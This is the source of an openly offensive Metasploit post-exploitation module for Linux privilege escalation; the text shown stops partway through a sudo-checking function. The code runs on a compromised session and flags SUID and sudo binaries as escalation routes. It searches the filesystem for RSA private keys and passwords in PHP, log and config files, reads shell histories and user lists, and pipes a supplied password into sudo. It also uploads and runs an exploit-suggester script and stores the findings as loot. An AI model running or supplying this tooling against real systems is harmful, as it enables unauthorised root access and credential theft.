##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

#TODO
# ptrace attack and other checks from: https://github.com/AlessandroZ/BeRoot/blob/master/Linux/beroot/checks/checks.py
# Check this for more stuff https://guif.re/linuxeop
#

  SUDO_QUICK_FAIL = [ 'ed', 'ftp', 'irb', 'journalctl', 'less', 'man', 'more', 'nano', 'pg', 'pico', 'run-mailcap', 'sftp', 'smbclient', 'vi', 'vim' ]

  SUDO_POSSIBLE_FAIL = [ 'apt', 'apt-get', 'ash', 'awk', 'bash', 'busybox', 'chmod', 'chown', 'cp', 'cpan', 'cpulimit', 'crontab', 'csh', 'curl', 'dash', 'dmesg', 'dmsetup', 'dnf',
                         'docker', 'dpkg', 'easy_install', 'emacs', 'env', 'expect', 'find', 'flock', 'gdb', 'gimp', 'git', 'ionice', 'jjs', 'jrunscript', 'ksh', 'logsave',
                         'ltrace', 'lua', 'mail', 'make', 'mount', 'mv', 'mysql', 'nc', 'ncat', 'netcat', 'nice', 'nmap', 'node', 'openssl', 'perl', 'php', 'pic', 'pip',
                         'puppet', 'python', 'python3', 'red', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'ruby', 'run-parts', 'rvim', 'scp', 'screen', 'script', 'sed', 'service',
                         'setarch', 'shuf', 'sh', 'socat', 'sqlite3', 'ssh', 'start-stop-daemon', 'stdbuf', 'strace', 'systemctl', 'tar', 'taskset', 'tclsh', 'tcpdump',
                         'tee', 'telnet', 'tftp', 'time', 'timeout', 'tmux', 'unshare', 'watch', 'wget', 'wish', 'xargs', 'yum', 'zip', 'zsh', 'zypper' ]

  SUDO_SUID_READ_FILE = [ 'arp', 'base64', 'cat', 'cut', 'date', 'dd', 'diff', 'expand', 'file', 'fmt', 'fold', 'grep', 'head', 'ip', 'jq', 'less', 'more', 'mtr', 'nl', 'od', 'pg', 'readelf',
                          'sort', 'tail', 'ul', 'unexpand', 'uniq', 'xxd' ]

  SUID_QUICK_FAIL = [ 'ash', 'bash', 'chmod', 'chown', 'cp', 'csh', 'curl', 'dash', 'dmsetup', 'env', 'expect', 'find', 'flock', 'gimp', 'ionice', 'jjs', 'jrunscript', 'ksh', 'logsave',
                      'make', 'mv', 'nano', 'ncat', 'nice', 'node', 'openssl', 'php', 'pico', 'python', 'python3', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'run-parts', 'shuf', 'sh', 'socat', 'start-stop-daemon',
                      'stdbuf', 'strace', 'systemctl', 'taskset', 'tclsh', 'tee', 'tftp', 'time', 'timeout', 'unshare', 'wget', 'xargs', 'zsh' ]

  SUID_POSSIBLE_FAIL = [ 'awk', 'busybox', 'docker', 'ed', 'emacs', 'gdb', 'git', 'lua', 'mysql', 'nc', 'netcat', 'nmap', 'pic', 'rvim', 'scp', 'sed', 'sqlite3', 'tar',
                         'telnet', 'vim', 'watch', 'zip' ]

  TOOLS = [ 'arp', 'awk', 'curl', 'docker', 'ed', 'emacs', 'expect', 'file', 'find', 'ftp', 'g++', 'gcc', 'gimp', 'git', 'irb', 'jjs', 'journalctl', 'jrunscript', 'lua',
            'mail', 'make', 'mysql', 'nano', 'nc', 'ncat', 'netcat', 'nmap', 'openssl', 'perl', 'php', 'pico', 'pip', 'python', 'python3', 'readelf', 'ruby',
            'scp', 'screen', 'script', 'sed', 'sftp', 'smbclient', 'socat', 'sqlite3', 'ssh', 'taskset', 'tcpdump', 'telnet', 'tftp', 'tmux', 'vi', 'vim', 'watch', 'wget', 'zip', 'zsh' ]

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Sn0wfa11\'s Linux PE Checker Module',
      'Description'   => %q{
        This module gathers a multitude of information for Linux privilege
        escalation. Initial work based on linuxprivchecker.py by Mike Czumak 
        and "Basic Linux Privilege Escalation" by g0tmi1l. 
        Now includes check and instructions for SUDO and SUID binaries based on gtfobins.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'sn0wfa11 <jhale85446[at]gmail.com>'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => 
        [
          [ 'URL', 'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' ],
          [ 'URL', 'https://github.com/mzet-/linux-exploit-suggester' ],
          [ 'URL', 'http://www.securitysift.com/download/linuxprivchecker.py' ],
          [ 'URL', 'https://github.com/rebootuser/LinEnum' ],
          [ 'URL', 'https://gtfobins.github.io' ]
        ]
    ))

    register_options(
      [
        OptInt.new('TIMEOUT', [ true, "Timeout on the execute command. (In seconds)", 300]),
        OptString.new('PASSWD', [ false, "Password of current user, for 'sudo su' check"]),
        OptBool.new('DEEP', [ true, "Perform Deep File Scan", true]),
        OptBool.new('LES', [ true, "Run Linux Exploit Suggester Script (Requires writable directory)", false]),
        OptString.new('WRITEABLE_DIR', [ false, "Writeable directory on target for Linux Exploit Suggester", "/tmp"]),
        OptString.new('LES_PATH', [ false, "Path to Linux Exploit Suggester on Local Machine", "/root/git/linux-exploit-suggester/linux-exploit-suggester.sh"])
      ], self.class)
  end

  def run
    final_output = ""
    welcome
    @@quick_fails_output = "\n[*] QUICK FAIL$:\n"

    sysinfo = get_sysinfo
    @@distro = file_read("/etc/issue")
    @@distro = @@distro.gsub(/\n|\\n|\\l/,'') if @@distro
    @@kernel_full = sysinfo[:kernel]
    if sysinfo[:version] && sysinfo[:version] != ""
      @@release = sysinfo[:version]
    else
      @@release = @@distro
    end
    @@user = execute("whoami")
    @@hostname = execute("hostname")
    @@suid_file_list = ""

    # Print the info
    print_status("Info:")
    print_good("\t#{@@distro}")
    print_good("\t#{@@kernel_full}")
    if datastore['PASSWD']
      print_status("\tModule running as \"#{@@user}\" user against #{@@hostname} with password: #{datastore['PASSWD']}")
    else
      print_status("\tModule running as \"#{@@user}\" user against #{@@hostname}")
    end

    final_output << bigline
    final_output << "LINUX PRIVILEGE ESCALATION CHECKS by sn0wfa11"
    final_output << bigline

    print_status("Getting Basic Info")
    basic_info_output = basic_info

    print_status("Looking for Quick Fails")
    @@quick_fails_output << quick_fails

    if datastore['LES']
      write_dir = datastore['WRITEABLE_DIR']
      les_path = datastore['LES_PATH']
      print_error("You must provide a writeable directory to run Linux Exploit Suggester") if !write_dir
      print_error("You must provide a path Linux Exploit Suggester") if !les_path
      les_output = prnt("Linux Exploit Suggester", les(les_path, write_dir)) if les_path && write_dir
    end

    print_status("Getting App and Tool Info")
    tools_info_output = tools_info

    print_status("Getting Network Info")
    network_info_output = network_info

    print_status("Getting Basic File System Info")
    filesystem_info_output = filesystem_info

    print_status("Getting User Info")
    user_info_output = user_info

    print_status("Getting Environmental Info")
    env_info_output = env_info

    print_status("Getting File and Directory Permissions")
    file_dir_perms_output = file_dir_perms

    print_status("Getting Processes and Application Information")
    proc_aps_info_output = proc_aps_info

    if datastore['DEEP']
      print_status("Getting Extra Information and Performing Deep File Search")
      extra_info_output = extra_info
    else
      print_status("Skipping Deep File Search")
      extra_info_output = ""
    end

    # Build final output
    final_output << basic_info_output + smline
    final_output << @@quick_fails_output + smline
    final_output << les_output + smline if les_output
    final_output << tools_info_output + smline
    final_output << network_info_output + smline
    final_output << filesystem_info_output + smline
    final_output << user_info_output + smline
    final_output << env_info_output + smline
    final_output << file_dir_perms_output + smline
    final_output << proc_aps_info_output + smline
    final_output << extra_info_output + smline
    final_output << bigline
    save(final_output)

  end

  ###########################################
  # Managment Functions
  ###########################################

  def welcome
    print_status("Welcome to Sn0wfa11's Linux PE Checker Module!")
    print_status("I work better if you have a password for your impersonated user. Use PASSWD=<their password>") if !datastore['PASSWD']
    print_status("I can run Linux Exploit Suggestion along with all the other checks. Use LES=true. (See module info)") if !datastore['LES']
    print_status("You should also look at running module post/multi/recon/local_exploit_suggester.")
    print_status("Also be sure to check \"top -c\" since I cannot do that for you.")
  end

  def bigline
    "\n=================================================================================================\n"
  end

  def smline
    "\n-------------------------------------------------------------------------------------------------\n"
  end

  def save(data, ctype = 'text/plain')
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, "priv_check.txt", "LINUX PRIV CHECK")
    print_good("LINUX PRIV CHECK stored in #{loot}")
  end

  def execute(cmd, time_out = datastore['TIMEOUT'])
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd, nil, time_out)
    vprint_line("#{output}")
    return output
  end

  def get(msg, cmd)
    output = "\n"
    output << "[+] #{msg}\n"
    result = execute(cmd)
    result.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    return output << "\n"
  end

  def get_h(msg, cmd)
    output = "\n"
    output << "[+] #{msg}\n"
    result = execute(cmd)
    return "" if !result or result == ""
    result.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    return output << "\n"
  end


  def prnt(msg, input)
    output = "\n"
    output << "[+] #{msg}\n"
    return output << format(input)
  end

  def format(input)
    output = ""
    return "" unless input
    input.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    return output  << "\n"
  end

  def check_message(message)
    print_good(message)
    @@quick_fails_output << "\n[+] #{message}\n"
  end

  #################################################
  # Linux Exploit Suggester Functions
  #################################################

  def les(les_path, write_dir)
    output = ""
    print_status("\nLinux Exploit Suggester")

    les_plant = upload_les(les_path, write_dir)
    if les_plant
      print_status("Setting Executable Rights")
      execute("chmod +x #{les_plant}")
      print_status("Running Linux Exploit Suggester... Stand by...")
      output = execute("#{les_plant}")
      if output != ""
        print("\n#{output}\n")
        output = format_les(output)
      else
        print_error("Linux Exploit Suggester Execution Failed :(")
      end
      rm_f(les_plant)
      return output
    else
      return ""
    end
  end

  def upload_les(les_path, write_dir)
    les_target = "#{write_dir}/#{Rex::Text.rand_text_alpha(8, "")}.sh"
    print_status("Attempting to upload #{les_path} to #{les_target} on #{sysinfo['Computer']}...")
    
    begin
      upload_file(les_target, les_path)
      if file?(les_target)
        print_good("LES uploaded!") 
        return les_target
      else
        print_error("Unable to upload")
        return nil
      end
    rescue ::Exception => e
      print_error("Error uploading LES: #{e.class} #{e}")
      print_error(e.to_s)
      return nil
    end
  end

  def format_les(input)
    output = input.gsub("[0m", "")
    output = output.gsub("[1;37m", "")
    output = output.gsub("[1;32m", "")
    output = output.gsub("[1;36m", "")
    output = output.gsub("[1;32m", "")
    output = output.gsub("[1;34m", "")
    output = output.gsub("[1;93m", "")
    output = output.gsub("[0;93m", "")
    output = output.gsub("[91;1m", "[*!]-> ")
    return output
  end

  #################################################
  # File Read Functions
  #
  # Why are these here and not just use cat???
  # Well... There are some CTF devs who like to
  # think they are sneaky and replace 'cat' with
  # say, a program that just prints an ASCII cat...
  # So these functions eliminate the use of 'cat'
  # in Meterpreter shells! No more ASCII cats!
  #################################################

  def file_to_array(file_name)
    result = file_read(file_name) if file_exist?(file_name)
    return nil unless result && result != ""
    return result.to_s.split("\n")
  end

  def file_read_grep(file_name, search_str)
    output = ""
    array = file_to_array(file_name)
    return nil unless array
    array.each do |line|
      output << "#{line}\n" if line =~ /#{search_str}/
    end
    return output
  end

  def get_file(msg, file_name)
    output = "\n"
    output << "[+] #{msg}\n"
    array = file_to_array(file_name)
    return "" unless array
    array.each do |line|
      output << "    #{line}\n"
    end
    return output << "\n"
  end

  def get_file_grep(msg, file_name, search_str, rev=false)
    output = "\n"
    output << "[+] #{msg}\n"
    array = file_to_array(file_name)
    return "" unless array
    array.each do |line|
      if rev
        output << "    #{line}\n" unless line =~ /#{search_str}/
      else
        output << "    #{line}\n" if line =~ /#{search_str}/
      end
    end
    return output
  end

  ########################################################
  # File Reading Base Functions
  #
  # Yes, yes... I stole these from
  # Msf::Post::File (read_file and _read_file_meterpreter)
  # I just couldn't handle the error handling...
  # Do you want a bunch of error messages when it cannot
  # open a file that you don't have access too?
  # I thought not ;)
  ########################################################

  def file_read(file_name)
    data = nil
    if session.type == "meterpreter"
      begin
        data = file_read_meterpreter(file_name)
      rescue
        vprint_error("Failed to open file: #{file_name}")
        return nil
      end
    elsif session.type == "shell"
      if session.platform == 'windows'
        data = session.shell_command_token("type \"#{file_name}\"")
      else
        data = session.shell_command_token("cat \"#{file_name}\"")
      end
    end
    return data
  end

  def file_read_meterpreter(file_name)
    begin
      fd = session.fs.file.new(file_name, "rb")
    rescue ::Rex::Post::Meterpreter::RequestError => e
      vprint_error("Failed to open file: #{file_name}: #{e}")
      return nil
    end
    data = fd.read
    begin
      until fd.eof?
        data << fd.read
      end
    ensure
      fd.close
    end
    return data
  end

  ###########################################
  # Enumeration Functions
  ###########################################

  def basic_info
    output = "\n[*] BASIC SYSTEM INFO:\n"
    output << prnt("Kernel", @@kernel_full)
    output << prnt("Hostname", @@hostname)
    output << prnt("Operating System", @@distro)
    output << prnt("Full Release Info", @@release) if @@release && @@release != ""
    output << cpu_info
    output << prnt("Current User", @@user)
    output << get("Current User ID", "id")
    output << sudo_rights
    output << get_h("UDEV - Check for PE if < 141 and Kernel 2.6.x!", "udevadm --version 2>/dev/null")
    output << get_h("Printer - CUPS???", "lpstat -a 2>/dev/null")
    return output
  end

  def quick_fails
    output = ""
    @@suid_file_list = suid_files # Check for suid quick fails, but print the suid files to loot later on.
    output << shellshock
    output << mysql_nopass
    output << mysql_as_root
    output << sudo_group
    output << sudo_su_check
    output << world_writable_passwd
    output << world_writable_shadow
    output << readable_shadow
    output << check_no_root_squash
    output << world_writable_exports
    output << docker_group
    return output
  end

  def tools_info
    output = "\n[*] PROGRAMMING LANGUAGES AND DEV TOOLS:\n"
    tools = TOOLS.dup
    cmd = "which "
    tools.each do |tool|
      cmd << tool
      cmd << " "
    end
    output << execute(cmd) + "\n"
    return output
  end

  def network_info
    output = "\n[*] NETWORKING INFO:\n"
    output << get("Interfaces", "/sbin/ifconfig -a")
    output << get("Netstat", "netstat -antup | grep -v 'TIME_WAIT' | grep -v 'CLOSE_WAIT'")
    output << get("Route", "/sbin/route")
    output << get_h("Iptables", "iptables -L 2>/dev/null")
    return output
  end

  def filesystem_info
    output = "\n[*] FILESYSTEM INFO:\n"
    output << get("Mount results", "mount")
    output << get_file("fstab entries", "/etc/fstab")
    output << get("Drive Info", "df -h")
    output << get_file("Checking Exports: If present look for no_root_squash on NFS.", "/etc/exports")
    output << get("Scheduled cron jobs", "ls -la /etc/cron* 2>/dev/null")
    output << get("System Crontab", "cat /etc/crontab")
    output << get_h("Crontab for current user", "crontab -l")
    output << get_h("Writable cron dirs", "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null")
    output << get_h("Anything in /var/spool/cron/crontabs", "ls -la /var/spool/cron/crontabs 2>/dev/null")
    output << get_h("Anacron Jobs", "ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null")
    return output
  end

  def user_info
    output = "\n[*] USER INFO:\n"
    output << get("Logged in User Activity", "w 2>/dev/null")
    output << get("Last user to log in", "lastlog 2>/dev/null | grep -v \"Never\" 2>/dev/null")
    output << get_h("Super Users Found:", "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'")
    output << get_h("Sudoers Configuration", "grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v \"#\" 2>/dev/null")
    output << get_h("Recent sudo's", "find /home -name .sudo_as_admin_successful 2>/dev/null")
    output << get_h("Root Permitted to SSH", "grep \"PermitRootLogin \" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" | awk '{print  $2}'")
    output << get_h("Root and Current User History Rights (depends on privs)", "ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null")
    output << history_info
    output << get_file_grep("Sudoers (privileged)", "/etc/sudoers", "#", true)
    output << get_file("All Users", "/etc/passwd")
    output << get_file_grep("User With Potential Login Rights", "/etc/passwd", "/bin/bash")
    output << get_file("Group List", "/etc/group")
    return output
  end

  def env_info
    output = "\n[*] ENVIRONMENTAL INFO:\n"
    output << get_h("SELinux Status", "sestatus 2>/dev/null")
    output << get_file("Available Shells", "/etc/shells")
    output << get("Current Umask values", "umask -S 2>/dev/null; umask 2>/dev/null")
    output << get("Umask in /etc/login.defs", "grep -i \"^UMASK\" /etc/login.defs 2>/dev/null")
    output << get("Environment Variables", "env 2>/dev/null | grep -v 'LS_COLORS'")
    output << get_h("Sockets - Look for strange stuff. Is tmux or screen installed?", "find / \\( -type s \\) -exec ls -ld {} \\; 2>/dev/null")
    output << get_h("Pipes - Look for strange stuff. Is tmux or screen installed?", "find / \\( -type p \\) -exec ls -ld {} \\; 2>/dev/null")
  end

  def file_dir_perms
    output = "\n[*] FILE AND DIRECTORY PERMISSIONS/CONTENTS:\n"
    output << get("Protected Files", "ls -al /etc/passwd; ls -al /etc/shadow; ls -al /etc/group")
    output << get("Logfile Permissions", "ls -al /var/log/syslog 2>/dev/null; ls -al /var/log/auth.log 2>/dev/null")
    output << get("World Writeable Directories for User/Group 'Root'", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep root")
    output << get("World Writeable Directories for Users other than Root", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root")
    output << get("World Writable Files", "find / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2>/dev/null")
    output << get("Checking if root's home folder is accessible", "ls -ahlR /root 2>/dev/null")
    output << @@suid_file_list
    output << get("SGID Files and Directories", "find / \\( -perm -2000 \\) -exec ls -ld {} \\; 2>/dev/null")
    return output
  end

  def proc_aps_info
    output = "\n[*] PROCESSES AND APPLICATIONS:\n"
    output << get_services(@@release)
    output << get("Current processes", "ps aux | awk '{print $1,$2,$9,$10,$11}'")
    output << get("Process binary path and permissions", "ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null")
    output << get_h("Apache Version and Modules", "apache2 -v 2>/dev/null; apache2ctl -M 2>/dev/null; httpd -v 2>/dev/null; apachectl -l 2>/dev/null")
    return output
  end

  def extra_info
    output = "\n[*] Extra Information and Deep File Search:\n"
    output << get_h("Find files with readable RSA Private Keys", "grep -Irni \"BEGIN RSA PRIVATE KEY\" / 2>/dev/null")
    output << get_h("GIT Directories", "find / \\( -type d -name \".git\" \\) -exec ls -ld {} \\; 2>/dev/null")
    output << get("Listing other home folders", "ls -ahlR /home 2>/dev/null")
    output << files_owned_users
    output << get_h("PHP Files Containing Keyword: 'password'", "find / -name '*.php' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWD' 2>/dev/null")
    output << get_h("Logs Containing Keyword: 'password'", "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWD' 2>/dev/null")
    output << get_h("Config Files Containing Keyword: 'password'", "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWD' 2>/dev/null")
    output << get_file("Apache Config File", "/etc/apache2/apache2.conf")
    output << get_packages(@@release)
    return output
  end

  ##########################################
  # User Enumeration Functions
  ##########################################
  def files_owned(user)
    return get("Files Owned by #{user}", "find / -user #{user} -type f -size +0M -ls 2>/dev/null")
  end

  def files_owned_users
    output = "\n[*] Files containing data owned by users other than root\n"
    initial_list = file_read_grep("/etc/passwd", "/bin/bash")
      initial_list.lines.each do |line|
        user = line.split(':')[0]
        output << files_owned(user) unless user == "root"
      end
    return output
  end

  ###########################################
  # Specific Distro Functions
  ###########################################

  def get_services(release)
    output = "\n[+] Current Services\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("/sbin/chkconfig --list 2>/dev/null")
    when /slackware/
      output << "\nEnabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'*$\' 2>/dev/null")
      output << "\n\nDisabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'[a-z0-9A-z]$\' 2>/dev/null")
    when /ubuntu|debian/
      output << execute("service --status-all 2>/dev/null")
    when /gentoo/
      output << execute("/bin/rc-status --all 2>/dev/null")
    when /arch/
      output << execute("/bin/egrep '^DAEMONS' /etc/rc.conf 2>/dev/null")
    else
      output << "Could not determine the Linux Distribution to get list of configured services\n"
    end
    output << "\n"
    return output
  end

  def get_packages(release)
    output = "\n[+] Installed Packages\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("rpm -qa | sort -u")
    when /slackware/
      output << execute("ls /var/log/packages")
    when /ubuntu|debian/
      output << execute("dpkg -l | awk '{$1=$4=\"\"; print $0}'")
    when /gentoo/
      output << execute("equery list")
    when /arch/
      output << execute("/usr/bin/pacman -Q")
    else
      output << "Could not determine package manager to get list of installed packages\n"
    end
    output << "\n"
    return output
  end

  ###########################################
  # Specific Checks
  ###########################################

  def history_info
    output = ""
    files = execute("ls ~/.*_history; ls /root/.*_history 2>/dev/null")
    return "" unless files
    files.lines.each do |line|
      output << get_file("History #{line}", line)
    end
    return output
  end

  def cpu_info
    output = ""
    result = file_read("/proc/cpuinfo")
    return "" unless result
    cpu_info = result.split("\n\n")[0]
    cpu_info.split("\n").each do |line|
      output << "Speed: " + line.split(': ')[1] + "\n" if line =~ /cpu MHz/
      output << "Product: " + line.split(': ')[1]  + "\n" if line =~ /model name/
      output << "Vendor: " + line.split(': ')[1] + "\n" if line =~ /vendor_id/
      output << "Bits: " + line.split(': ')[1] + "\n" if line =~ /cache_alignment/
    end
    output << "Cores: " + result.split("\n\n").size.to_s
    return prnt("Processor Information", output)
  end

  ###########################################
  # SUID Checks
  ###########################################

  def suid_files
    output = ""
    files = execute("find / \\( -perm -4000 \\) -exec ls -al --full-time {} \\; 2>/dev/null | sort -k6 | cut -d \" \" --complement -f 7,8")
    files = files.split("\n")
    files.each do |file|
      file = file.strip
      suid_user = file.split(" ")[2].strip
      check_suid_quick_fails(file, suid_user)
      check_suid_possible_fails(file, suid_user)
      check_suid_read_fails(file, suid_user)
      output << "#{file}\n"
    end
    return prnt("SUID Files **LOOK AT EACH ONE OF THESE!!! WHAT DO THEY DO? strings <file>**", output)
  end

  def check_suid_quick_fails(file, suid_user)
    suid_bins = SUID_QUICK_FAIL.dup
    suid_bins.each do |bin|
      if file.downcase =~ /(\/#{bin}$)/
        check_message("QUICKFAIL!: #{bin} has suid bit set and can be run as #{suid_user}!")
        instructions = sudo_suid_instructions(bin, "suid")
        print_good("#{instructions}")
        print_good("\t#{file}")
        @@quick_fails_output << "\n#{instructions}\n"
        @@quick_fails_output << format(file)
      end
    end
  end

  def check_suid_possible_fails(file, suid_user)
    suid_bins = SUID_POSSIBLE_FAIL.dup
    suid_bins.each do |bin|
      if file.downcase =~ /(\/#{bin}$)/
        check_message("Possible Fail: #{bin} has suid bit set and can be run as #{suid_user}.")
        instructions = sudo_suid_instructions(bin, "suid")
        print_good("#{instructions}")
        print_good("\t#{file}")
        @@quick_fails_output << "\n#{instructions}\n"
        @@quick_fails_output << format(file)
      end
    end
  end

  def check_suid_read_fails(file, suid_user)
    suid_bins = SUDO_SUID_READ_FILE.dup
    suid_bins.each do |bin|
      if file.downcase =~ /(\/#{bin}$)/
        check_message("Possible Read File: #{bin} has suid bit set and can be run as #{suid_user}.")
        instructions = sudo_suid_instructions(bin, "suid")
        print_good("#{instructions}")
        print_good("\t#{file}")
        @@quick_fails_output << "\n#{instructions}\n"
        @@quick_fails_output << format(file)
      end
    end
  end

  ###########################################
  # SUDO Checks
  ###########################################

  def sudo_rights
    print_status("Checking SUDO Rights")
    output = ""
    datastore['PASSWD'] ? password = datastore['PASSWD'] : password = ""
    result = execute("echo #{password} | sudo -S -ll")
    if result =~ /incorrect password/ && !datastore['PASSWD']
      print_error("\tPassword Required to Check Sudo. Use PASSWD=<user's password>")
      return prnt("SUDO rights check", "Password Required to Check")
    elsif result =~ /incorrect password/ && datastore['PASSWD']
      print_error("\tPassword Provided for SUDO Check is Incorrect.")
      return prnt("SUDO rights check", "Incorrect Password Provided")
    elsif result =~ /may not run sudo/
      print_status("\tUser #{@@user} does not have SUDO rights.")
      return prnt("SUDO rights check", "User #{@@user} does not have SUDO rights.")
    end

    if result =~ /Sudoers entry:/
      print_good("User has some SUDO Rights. Check output.")
      parse_sudo(result)
    end

    if result.downcase =~ /\!env_reset/ ## TODO Instructions for this.
      check_message("QUICKFAIL!: User #{@@user} has property '!env_reset' in sudo!")
    end

    if result.downcase =~ /env_keep\+\=ld_preload/
      check_message("Possible Fail: User #{@@user} has property 'env_keep+=LD_PRELOAD' in sudo. Older Sudo might work. Check loot file for instructions.")
      @@quick_fails_output << ld_preload_instructions
    end

    # TODO Look at post/multi/recon/sudo_commands and see how he is formating the results

    return prnt("SUDO rights check", result)
  end

  def parse_sudo(sudo_in)
    sudo_splits = sudo_in.split("Sudoers entry:").collect(&:strip)
    for x in 1..(sudo_splits.length - 1)
      parse_sudo2(sudo_splits[x])
    end
  end

  def parse_sudo2(entry)
    entry =~ /!authenticate/ ? auth = false : auth = true
    priv_user = false
    users = parse_sudo_users(entry) if entry =~ /RunAsUsers: /
    sudo_bins = parse_sudo_bins(entry)
    check_sudo_all_rights(sudo_bins, users, auth)
    check_sudo_wildcard(sudo_bins, users, auth)
    check_sudo_quick_fails_bins(sudo_bins, users, auth)
    check_sudo_possible_fails_bins(sudo_bins, users, auth)
    check_sudo_read_file_bins(sudo_bins, users, auth)
  end

  def parse_sudo_users(entry)
    entry_lines = entry.split("\n").collect(&:strip)
    entry_lines.each do |line|
      if line =~ /RunAsUsers: /
        users_raw = line.split(": ")[1].strip
        return users_raw.split(", ").collect(&:strip)
      end
    end
    return nil
  end

  def parse_sudo_bins(entry)
    bins = []
    entry_lines = entry.split("\n").collect(&:strip)
    bin_entry = false
    for x in 0..(entry_lines.length - 1)
      bins.push(entry_lines[x]) if bin_entry
      bin_entry = true if entry_lines[x] =~ /Commands:/
    end
    return bins
  end

  def priv_user(users)
    if users.include?("root") || users.include?("ALL")
      return true
    else
      return false
    end
  end

  def check_sudo_all_rights(sudo_bins, users, auth)
    sudo_bins.each do |sudo_bin|
      if sudo_bin =~ /ALL/
        if priv_user(users) && (!auth || datastore['PASSWD'])
          check_message("QUICKFAIL!: User #{@@user} has sudo rights to #{sudo_bin} as #{users.join(", ")}!")
        elsif priv_user(users) && (auth && !datastore['PASSWD'])
          check_message("Possible Fail: User #{@@user} has sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
        elsif !priv_user(users) && (!auth || datastore['PASSWD'])
          check_message("FYI: User #{@@user} has sudo rights to #{sudo_bin} as #{users.join(", ")}")
        else
          check_message("FYI: User #{@@user} has sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
        end
      end
    end
  end

  def check_sudo_wildcard(sudo_bins, users, auth)
    sudo_bins.each do |sudo_bin|
      if sudo_bin =~ /\*/
        if priv_user(users) && (!auth || datastore['PASSWD'])
          check_message("Possible Fail: User #{@@user} has sudo rights with wildcard to #{sudo_bin} as #{users.join(", ")}")
        elsif priv_user(users) && (auth && !datastore['PASSWD'])
          check_message("Possible Fail: User #{@@user} has sudo rights with wildcard to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
        elsif !priv_user(users) && (!auth || datastore['PASSWD'])
          check_message("FYI: User #{@@user} has sudo rights to #{sudo_bin} with wildcard as #{users.join(", ")}")
        else
          check_message("FYI: User #{@@user} has sudo rights to #{sudo_bin} with wildcard as users: #{users.join(", ")}. However, a password is required.")
        end
      end
    end
  end

  def check_sudo_quick_fails_bins(sudo_bins, users, auth)
    bins = SUDO_QUICK_FAIL.dup
    sudo_bins.each do |sudo_bin|
      bins.each do |bin|
        if sudo_bin =~ /(\/| )(#{bin})( |$)/
          if priv_user(users) && (!auth || datastore['PASSWD'])
            check_message("QUICKFAIL!: User #{@@user} has sudo rights to #{sudo_bin} as #{users.join(", ")}!")
          elsif priv_user(users) && (auth && !datastore['PASSWD'])
            check_message("Possible Fail: User #{@@user} has sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
          elsif !priv_user(users) && (!auth || datastore['PASSWD'])
            check_message("FYI: User #{@@user} has sudo rights to #{sudo_bin} as #{users.join(", ")}")
          else
            check_message("FYI: User #{@@user} has sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
          end
          file = bin.split("/").last.strip
          instructions = sudo_suid_instructions(file, "sudo")
          print_good("#{instructions}")
          @@quick_fails_output << "\n#{instructions}\n"  # Get PE instructions based on checked file
        end
      end
    end
  end

  def check_sudo_possible_fails_bins(sudo_bins, users, auth)
    bins = SUDO_POSSIBLE_FAIL.dup
    sudo_bins.each do |sudo_bin|
      bins.each do |bin|
        if sudo_bin =~ /(\/| )(#{bin})( |$)/
          if sudo_bin =~ /(\/| )(#{bin}$)/
            if priv_user(users) && (!auth || datastore['PASSWD'])
              check_message("QUICKFAIL!: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}!")
            elsif priv_user(users) && (auth && !datastore['PASSWD'])
              check_message("Possible Fail: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
            elsif !priv_user(users) && (!auth || datastore['PASSWD'])
              check_message("FYI: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}")
            else
              check_message("FYI: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
            end
          else
            check_message("FYI: User #{@@user} has restricted sudo rights to #{bin} as users: #{users.join(", ")}. Rights = #{sudo_bin}")
          end
          file = bin.split("/").last.strip
          instructions = sudo_suid_instructions(file, "sudo")
          print_good("#{instructions}")
